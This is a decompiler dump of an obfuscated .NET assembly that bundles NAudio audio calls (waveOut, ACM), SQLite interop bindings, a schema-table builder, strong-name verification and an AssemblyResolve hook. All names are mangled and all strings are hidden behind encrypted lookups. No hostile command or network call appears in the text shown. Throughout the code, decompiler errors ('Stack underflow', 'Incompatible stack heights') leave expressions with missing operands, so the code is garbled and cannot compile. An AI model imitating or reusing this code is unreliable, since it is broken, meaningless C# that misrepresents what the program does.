			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_002b: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Expected I4, but got Unknown
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_0034: Incompatible stack heights: 0 vs 2
			_ = (/*Error near IL_0008: Stack underflow*/ & -16777216) >> 24;
			_003F val = /*Error near IL_0013: Stack underflow*/& 0xFF0000;
			_ = /*Error near IL_0016: Stack underflow*/| (val >> 8);
			_003F val2 = /*Error near IL_001e: Stack underflow*/& 0xFF00;
			return (uint)(int)(/*Error near IL_0021: Stack underflow*/ | (val2 << 8) | ((_0002 & 0xFF) << 24));
		}

		[DllImport("winmm.dll", EntryPoint = "waveOutPrepareHeader")]
		static extern MmResult _0001(IntPtr _0002, _007F._0006 _0003, int _0004);

		static void _0001(global::_0017._000F P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0017._000F)/*Error near IL_0007: Stack underflow*/)._0001, false);
		}

		static void _0001(global::_0004._0008 P_0)
		{
			//IL_0084: Incompatible stack heights: 0 vs 2
			//IL_008e: Incompatible stack heights: 0 vs 3
			//IL_0095: Incompatible stack heights: 0 vs 1
			_ = _009F_0002._007E_001C_0006;
			_ = ((global::_0004._0008)/*Error near IL_000c: Stack underflow*/)._0001;
			_ = _0087_0003._007E_0081_0007;
			_0082_0002._0088_0005();
			_0080._0014._0001(107361606);
			byte[] array = /*Error near IL_0024: Stack underflow*/((object)/*Error near IL_0024: Stack underflow*/, (string)/*Error near IL_0024: Stack underflow*/);
			/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, array);
			P_0._0001 = global::_0012._007E_0091_0002(P_0._0001);
			_009D_0002._007E_0016_0006(P_0._0001, 0);
			_009D_0002._007E_0016_0006(P_0._0001, 0);
			_009F_0002._007E_001C_0006(P_0._0001, _0018._0001(P_0._0001.BlockAlign, P_0));
		}

		static void _0001(global::_0017._0006 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			Exception ex = default(Exception);
			if (0 == 0)
			{
				ex = null;
			}
			try
			{
				_0018._0001((global::_0017._0006)/*Error near IL_0013: Stack underflow*/);
			}
			catch (Exception ex2)
			{
				ex = ex2;
			}
			finally
			{
				P_0._0001 = false;
				_0018._0001(P_0, ex);
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("winmm.dll", EntryPoint = "waveOutOpen")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, global::_0005._0005 _0004, IntPtr _0005, IntPtr _0006, global::_0017._0008._0001 _0007);

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_database_name16_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		static _001B._0004? _0001(int _0002, int _0003, _001E._0004 P_2)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((_001E._0004)/*Error near IL_0007: Stack underflow*/)._0001;
				if (((global::_0013._0005)/*Error near IL_0012: Stack underflow*/)._0001((int)/*Error near IL_0012: Stack underflow*/, (int)/*Error near IL_0012: Stack underflow*/, out _001B._0004 value) == 0)
				{
					_0018._0001(ref value);
					return value;
				}
			}
			catch (COMException ex)
			{
				if (ex._0001() != -2147220986)
				{
					throw;
				}
			}
			return null;
		}

		static void _0001(_001D._0016 _0002, float _0003, float _0004, float P_3)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a4: Incompatible stack heights: 0 vs 3
			//IL_00aa: Incompatible stack heights: 0 vs 2
			//IL_00b4: Expected F8, but got Unknown
			//IL_00b4: Incompatible stack heights: 0 vs 2
			_ = global::_0015._009B_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0014: Stack underflow*/;
			_ = /*Error near IL_0015: Stack underflow*/* num;
			double num2 = (double)/*Error near IL_001b: Stack underflow*/;
			Math.Cos(/*Error near IL_001c: Stack underflow*/ / num2);
			double num3 = (double)/*Error near IL_0023: Stack underflow*/;
			double num4 = /*Error near IL_0028: Stack underflow*/((double)/*Error near IL_0028: Stack underflow*/) / (double)(2f * P_3);
			double num5 = (1.0 - num3) / 2.0;
			double num6 = 1.0 - num3;
			double num7 = (1.0 - num3) / 2.0;
			double num8 = 1.0 + num4;
			double num9 = -2.0 * num3;
			double num10 = 1.0 - num4;
			_0018._0001(num5, _0002, num7, num9, num8, num10, num6);
		}

		static ushort _0001(ushort _0002)
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 2
			_ = (/*Error near IL_0008: Stack underflow*/ & 0xFF00) >> 8;
			_003F val = /*Error near IL_0012: Stack underflow*/& 0xFF;
			return (ushort)(/*Error near IL_0015: Stack underflow*/ | (val << 8));
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_text_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		static _0080._0017 _0001(bool _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			_0018._0001((byte)/*Error near IL_000d: Stack underflow*/ != 0);
			return (_0080._0017)/*Error near IL_0005: Stack underflow*/;
		}

		[DllImport("kernel32.dll", EntryPoint = "FreeLibrary")]
		static extern bool _0001(IntPtr _0002);

		static void _0001(global::_0010._001C P_0)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0010._001C)/*Error near IL_0016: Stack underflow*/);
			((global::_0010._001C)/*Error near IL_000d: Stack underflow*/)._0001(_0002: true, _0003: false);
		}

		static void _0001(_001F._0001 P_0)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			new Container();
			((_001F._0001)/*Error near IL_0009: Stack underflow*/)._0001 = (IContainer)/*Error near IL_0009: Stack underflow*/;
		}

		static void _0001(float _0002, _001D._0015 _0003, long _0004, float[] _0005, float P_4)
		{
			//IL_0019: Incompatible stack heights: 0 vs 2
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			_ = 10;
			_0018._0001((long)/*Error near IL_0017: Stack underflow*/, (long)/*Error near IL_0017: Stack underflow*/, (float)/*Error near IL_0017: Stack underflow*/, (_001D._0015)/*Error near IL_0017: Stack underflow*/, 2048L, P_4, _0005);
		}

		static bool _0001(MixerControlType _0002)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_0013: Invalid comparison between Unknown and I4
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_003a: Expected I4, but got Unknown
			//IL_0073: Incompatible stack heights: 0 vs 1
			//IL_0079: Incompatible stack heights: 0 vs 1
			//IL_007f: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0009: Stack underflow*/ <= 553713664)
			{
				if ((int)/*Error near IL_0015: Stack underflow*/ != 268500992)
				{
					switch (/*Error near IL_001d: Stack underflow*/ - 536936448)
					{
					case 0:
					case 1:
					case 2:
					case 3:
					case 4:
					case 5:
						goto IL_006e;
					}
					if (_0002 != MixerControlType.Button)
					{
						goto IL_0070;
					}
				}
				goto IL_006e;
			}
			if (_0002 <= MixerControlType.Mux)
			{
				if (_0002 == MixerControlType.SingleSelect || _0002 == MixerControlType.Mux)
				{
					goto IL_006e;
				}
			}
			else if (_0002 == MixerControlType.MultipleSelect || _0002 == MixerControlType.Mixer)
			{
				goto IL_006e;
			}
			goto IL_0070;
			IL_0070:
			return false;
			IL_006e:
			return true;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_bind_parameter_index")]
		static extern int _0001(IntPtr _0002, byte[] _0003);

		static void _0001(object _0002, global::_0008._0012 _0003)
		{
			//IL_0160: Incompatible stack heights: 0 vs 1
			//IL_0166: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				return;
			}
			string text = ((global::_0008._0012)/*Error near IL_0012: Stack underflow*/)._0001;
			if (text == null)
			{
				text = _0080._0014._0001(107357341);
			}
			else
			{
				text = global::_0002._007E_000F(text);
				if (global::_001A._007E_0016_0003(text) == 0)
				{
					text = _0080._0014._0001(107357332);
				}
			}
			object obj = _0003._0001;
			string text2 = _0080._0014._0001(107357287);
			if (obj is _0080._0017 || obj is int)
			{
				_0080._0017 obj2 = (_0080._0017)(int)obj;
				switch (obj2 & _0080._0017._0086)
				{
				case _0080._0017._0002:
					text2 = _0080._0014._0001(107357310);
					break;
				case _0080._0017._0081:
					text2 = _0080._0014._0001(107357297);
					break;
				case _0080._0017._0082:
					text2 = _0080._0014._0001(107357256);
					break;
				case _0080._0017._0083:
				case _0080._0017._0084:
					text2 = _0080._0014._0001(107360140);
					break;
				}
			}
			else if (obj == null)
			{
				text2 = _0080._0014._0001(107357275);
			}
			if (obj != null && !_008B_0005._001A_000F(obj, string.Empty))
			{
				_0015_0004._001E_0008(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107357266), new object[3] { text2, obj, text }));
			}
			else
			{
				_0015_0004._001E_0008(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107357237), new object[2] { text2, text }));
			}
		}

		static void _0001(global::_0014._0001 P_0)
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			_ = _0082_0003._0013_0007;
			_0080._0014._0001(107357184);
			/*Error near IL_0034: Stack underflow*/((object)/*Error near IL_0034: Stack underflow*/, (string)/*Error near IL_0034: Stack underflow*/);
			_008C_0005._001B_000F(P_0, new Size(104, 16));
		}

		static float _0001(_001D._0014 P_0)
		{
			//IL_00f3: Incompatible stack heights: 0 vs 1
			//IL_00ff: Incompatible stack heights: 0 vs 1
			_001D._0014._0001 obj = ((_001D._0014)/*Error near IL_000a: Stack underflow*/)._0001;
			switch (/*Error near IL_002d: Stack underflow*/)
			{
			case 1L:
				P_0._0001 = P_0._0010 + P_0._0001 * P_0._0005;
				if (P_0._0001 >= 1f)
				{
					P_0._0001 = 1f;
					P_0._0001 = _001D._0014._0001._0003;
				}
				break;
			case 2L:
				P_0._0001 = P_0._0011 + P_0._0001 * P_0._0006;
				if (P_0._0001 <= P_0._0008)
				{
					P_0._0001 = P_0._0008;
					P_0._0001 = _001D._0014._0001._0004;
				}
				break;
			case 4L:
				P_0._0001 = P_0._0012 + P_0._0001 * P_0._0007;
				if ((double)P_0._0001 <= 0.0)
				{
					P_0._0001 = 0f;
					P_0._0001 = _001D._0014._0001._0001;
				}
				break;
			}
			return P_0._0001;
		}

		static bool _0001(_001A._0005 P_0)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			if (((_001A._0005)/*Error near IL_0007: Stack underflow*/)._0001._0001 != WaveFormatEncoding.Pcm)
			{
				return ((_001A._0005)/*Error near IL_0016: Stack underflow*/)._0001._0003 != 0;
			}
			return false;
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmFormatSuggest")]
		static extern MmResult _0001(IntPtr _0002, [In][MarshalAs(UnmanagedType.CustomMarshaler, MarshalType = "NAudio.Wave.WaveFormatCustomMarshaler")] global::_0005._0005 _0003, [In][Out][MarshalAs(UnmanagedType.CustomMarshaler, MarshalType = "NAudio.Wave.WaveFormatCustomMarshaler")] global::_0005._0005 _0004, int _0005, global::_0005._000F _0006);

		static void _0001(global::_0007._0014 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			((global::_0007._0014)/*Error near IL_0007: Stack underflow*/)._0001._0003();
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_backup_finish_interop")]
		static extern _0080._0017 _0001(IntPtr _0002);

		static void _0001(AppDomain _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			ResolveEventHandler value = _0018._0001;
			((AppDomain)/*Error near IL_0019: Stack underflow*/).AssemblyResolve += value;
		}

		static uint _0001(byte[] _0002)
		{
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 1
			if (((Array)/*Error near IL_0003: Stack underflow*/).Length != 4)
			{
				_0080._0014._0001(107357203);
				new Exception((string?)/*Error near IL_0038: Stack underflow*/);
				throw /*Error near IL_0011: Stack underflow*/;
			}
			return (uint)((_0002[0] << 24) | (_0002[1] << 16) | (_0002[2] << 8) | _0002[3]);
		}

		static DataTable _0001(global::_0017._0080 _0002, string _0003, string _0004, string P_3)
		{
			//IL_0b6d: Incompatible stack heights: 0 vs 1
			//IL_0b77: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107357646);
			new DataTable((string?)/*Error near IL_0b77: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_0b7d: Stack underflow*/;
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107357661), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107357612), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107357627), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107357582), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362308), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362799), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362814), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362765), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362780), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359298), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359273), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359284), _0091._0080_0004(typeof(long).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359235), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359250), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359736), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359670), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359645), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359592), _0091._0080_0004(typeof(long).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359567), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359570), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359541), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359516), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358947), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362738), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358899), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358850), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358869), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358816), _0091._0080_0004(typeof(bool).TypeHandle));
			if (global::_001C._0096_0003(_0003))
			{
				_0003 = _0080._0014._0001(107401775);
			}
			string text = ((_009D_0003._009D_0007(_0003, _0080._0014._0001(107401766), StringComparison.OrdinalIgnoreCase) == 0) ? _0080._0014._0001(107362630) : _0080._0014._0001(107362683));
			global::_0008._007E_0011_0002(dataTable);
			global::_0010._001C obj = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107357589), new object[2] { _0003, text }), _0002);
			try
			{
				_0014 obj2 = _0018._0001(obj);
				try
				{
					while (global::_001B._007E_008F_0003(obj2))
					{
						if (!global::_001C._0096_0003(_0004) && _009D_0003._009D_0007(_0004, _009E_0003._007E_0001_0008(obj2, 2), StringComparison.OrdinalIgnoreCase) != 0)
						{
							continue;
						}
						global::_0010._001C obj3 = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107358738), new object[2]
						{
							_0003,
							_009E_0003._007E_0001_0008(obj2, 2)
						}), _0002);
						try
						{
							string text2 = _008D_0005._007E_001D_000F(_008D_0005._007E_001D_000F(_008D_0005._007E_001D_000F(_009E_0003._007E_0001_0008(obj2, 4), '\r', ' '), '\n', ' '), '\t', ' ');
							int num = _008F_0005._007E_001F_000F(_008E_0005._007E_001E_000F(_008F_0003._008B_0007()), text2, _0080._0014._0001(107357520), CompareOptions.IgnoreCase);
							if (num < 0)
							{
								continue;
							}
							text2 = _009E_0003._007E_009E_0007(text2, num + 4);
							global::_0010._001C obj4 = new global::_0010._001C(text2, _0002);
							try
							{
								_0014 obj5 = _0018._0001(CommandBehavior.SchemaOnly, obj3);
								try
								{
									_0014 obj6 = _0018._0001(CommandBehavior.SchemaOnly, obj4);
									try
									{
										DataTable dataTable2 = _0018._0001(obj5, false, false);
										try
										{
											DataTable dataTable3 = _0018._0001(obj6, false, false);
											try
											{
												for (num = 0; num < global::_001A._007E_001E_0003(_0006_0005._007E_008F_000E(dataTable3)); num++)
												{
													DataRow dataRow = _0090_0005._007E_007F_000F(_0006_0005._007E_008F_000E(dataTable2), num);
													DataRow dataRow2 = _0090_0005._007E_007F_000F(_0006_0005._007E_008F_000E(dataTable3), num);
													if (_009D_0003._009D_0007(global::_0002._007E_0006(_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.ColumnName)), P_3, StringComparison.OrdinalIgnoreCase) == 0 || P_3 == null)
													{
														DataRow dataRow3 = _0005_0005._007E_008E_000E(dataTable);
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107357661), _0003);
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107357627), _009E_0003._007E_0001_0008(obj2, 2));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107362308), _0003);
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107362799), _0006_0004._007E_0010_0008(dataRow2, SchemaTableColumn.BaseSchemaName));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107362814), _0006_0004._007E_0010_0008(dataRow2, SchemaTableColumn.BaseTableName));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107362765), _0006_0004._007E_0010_0008(dataRow2, SchemaTableColumn.BaseColumnName));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107357582), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.ColumnName));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107359298), _0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.DefaultValue) != DBNull.Value);
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107359273), _0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.DefaultValue));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107362780), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.ColumnOrdinal));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107359235), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.AllowDBNull));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107359250), _0006_0004._007E_0010_0008(dataRow, _0080._0014._0001(107359181)));
														_0083_0004 obj7 = _0083_0004._007E_0093_0008;
														string text3 = _0080._0014._0001(107358850);
														DbType dbType = (DbType)_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.ProviderType);
														SQLiteConnectionFlags sQLiteConnectionFlags = _0002._0003;
														obj7(dataRow3, text3, _0097_0003._007E_0096_0007(global::_0002._007E_0006(_0018._0001(sQLiteConnectionFlags, dbType, _0002)), _008F_0003._008B_0007()));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107359736), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.ColumnSize));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107362799), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.BaseSchemaName));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107358899), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.IsKey));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107358869), _0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.IsAutoIncrement));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107362738), _0006_0004._007E_0010_0008(dataRow, _0080._0014._0001(107359196)));
														_0083_0004._007E_0093_0008(dataRow3, _0080._0014._0001(107358816), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.IsUnique));
														_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow3);
													}
												}
											}
											finally
											{
												if (dataTable3 != null)
												{
													global::_0008._007E_0098(dataTable3);
												}
											}
										}
										finally
										{
											if (dataTable2 != null)
											{
												global::_0008._007E_0098(dataTable2);
											}
										}
									}
									finally
									{
										if (obj6 != null)
										{
											global::_0008._007E_0098(obj6);
										}
									}
								}
								finally
								{
									if (obj5 != null)
									{
										global::_0008._007E_0098(obj5);
									}
								}
							}
							finally
							{
								if (obj4 != null)
								{
									global::_0008._007E_0098(obj4);
								}
							}
						}
						finally
						{
							if (obj3 != null)
							{
								global::_0008._007E_0098(obj3);
							}
						}
					}
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
			global::_0008._007E_0012_0002(dataTable);
			global::_0008._007E_0013_0002(dataTable);
			return dataTable;
		}

		static bool _0001(global::_0001._001A _0002, string _0003)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return false;
			}
			try
			{
				DateTime dateTime = _0018._0001((global::_0001._001A)/*Error near IL_000f: Stack underflow*/, (string)/*Error near IL_000f: Stack underflow*/);
				if (_0099_0003._0099_0007(_0018._0001(_0002, dateTime), _0003, StringComparison.Ordinal))
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		static void _0001(_0019._0005 P_0)
		{
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			if (((_0019._0005)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				global::_0007._0007[] array = ((_0019._0005)/*Error near IL_0010: Stack underflow*/)._0001;
				for (int i = 0; i < array.Length; i++)
				{
					array[i]._0002();
				}
				P_0._0001 = null;
			}
		}

		static string _0001(Guid _0002)
		{
			//IL_0049: Incompatible stack heights: 0 vs 2
			//IL_004c: Incompatible stack heights: 0 vs 2
			for (int i = 0; i < global::_0008._0005._0001.Length; i++)
			{
				_ = _0094_0002._0004_0006;
				_ = global::_0008._0005._0001;
				Guid guid = ((Guid[])/*Error near IL_0018: Stack underflow*/)[/*Error near IL_0018: Stack underflow*/];
				if (/*Error near IL_001d: Stack underflow*/((Guid)/*Error near IL_001d: Stack underflow*/, guid))
				{
					return global::_0008._0005._0001[i];
				}
			}
			throw new ArgumentException(_0080._0014._0001(107357479));
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_release_memory")]
		static extern int _0001(int _0002);

		static global::_0005._0005 _0001(BinaryReader _0002, int _0003)
		{
			//IL_0019: Incompatible stack heights: 0 vs 3
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 2
			new global::_0013._0007();
			_0018._0001((global::_0005._0005)/*Error near IL_000f: Stack underflow*/, (BinaryReader)/*Error near IL_000f: Stack underflow*/, (int)/*Error near IL_000f: Stack underflow*/);
			/*Error near IL_000f: Stack underflow*/;
			_0018._0001((global::_0013._0007)/*Error near IL_0017: Stack underflow*/, (BinaryReader)/*Error near IL_0017: Stack underflow*/);
			return (global::_0005._0005)/*Error near IL_0018: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_value_type")]
		static extern global::_0014._0017 _0001(IntPtr _0002);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_open_v2")]
		static extern _0080._0017 _0001(byte[] _0002, ref IntPtr _0003, global::_0004._0015 _0004, byte[] _0005);

		static void _0001(global::_0017._0080 _0002, bool P_1)
		{
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0022: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				_0002._0001._0004(P_1);
			}
		}

		static void _0001(_001C._0004 _0002, global::_0017._0011 P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			_0018._0001((_001C._0004)/*Error near IL_0017: Stack underflow*/);
			((global::_0017._0011)/*Error near IL_000b: Stack underflow*/)._0001((global::_0002._0007)/*Error near IL_000b: Stack underflow*/);
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmStreamPrepareHeader")]
		static extern MmResult _0001(IntPtr _0002, [In][Out] global::_0013._000E _0003, int _0004);

		static void _0001(global::_0017._0019 P_0)
		{
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			((global::_0017._0019)/*Error near IL_0007: Stack underflow*/)._0001._0001(global::_0006._0011._0001, IntPtr.Zero);
			((global::_0017._0019)/*Error near IL_0016: Stack underflow*/)._0001._0001(global::_0006._0011._0006, IntPtr.Zero);
			P_0._0001._0001(global::_0006._0011._000E, IntPtr.Zero);
			P_0._0002 = true;
		}

		static string _0001(object _0002, IFormatProvider _0003)
		{
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return null;
			}
			if (/*Error near IL_0009: Stack underflow*/ is string)
			{
				return (string)/*Error near IL_0012: Stack underflow*/;
			}
			if (_0002 is IConvertible convertible)
			{
				return _0091_0005._007E_0080_000F(convertible, _0003);
			}
